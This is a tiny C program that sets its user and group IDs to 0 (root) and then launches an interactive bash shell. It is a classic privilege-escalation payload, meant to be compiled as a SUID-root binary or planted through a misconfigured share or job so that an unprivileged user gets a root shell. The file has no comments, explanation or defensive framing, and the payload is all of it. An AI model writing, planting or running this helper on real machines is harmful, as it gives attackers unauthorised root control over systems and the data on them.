#include <stdlib.h>
void main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
